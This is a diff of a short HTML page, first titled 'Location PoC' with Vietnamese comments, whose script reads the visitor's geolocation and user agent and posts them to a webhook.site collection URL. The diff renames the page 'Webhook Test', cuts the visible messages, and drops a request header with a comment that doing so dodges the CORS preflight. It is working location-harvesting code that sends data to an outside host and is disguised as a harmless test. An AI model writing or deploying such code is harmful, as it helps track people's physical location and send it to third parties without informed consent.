@@ -2,29 +2,22 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Location PoC</title>
+  <title>Webhook Test</title>
 </head>
 <body>
-  <h2>Đang lấy vị trí...</h2>
+  <h2>Sending location...</h2>
   <script>
     const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
 
     function sendToWebhook(data) {
+      // Không set Content-Type: application/json để tránh CORS preflight
       fetch(webhook, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
+        body: JSON.stringify(data) // vẫn gửi JSON nhưng dưới dạng text/plain
       })
       .then(() => console.log("Sent:", data))
       .catch(e => console.error("Error:", e));
     }
-
-    // Luôn gửi ít nhất một bản ghi cơ bản
-    sendToWebhook({
-      status: "init",
-      ua: navigator.userAgent,
-      time: new Date().toISOString()
-    });
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -46,7 +39,7 @@
             ua: navigator.userAgent,
             time: new Date().toISOString()
           });
-          document.body.innerHTML += "<p>GPS denied, fallback data sent!</p>";
+          document.body.innerHTML += "<p>GPS denied!</p>";
         }
       );
     } else {
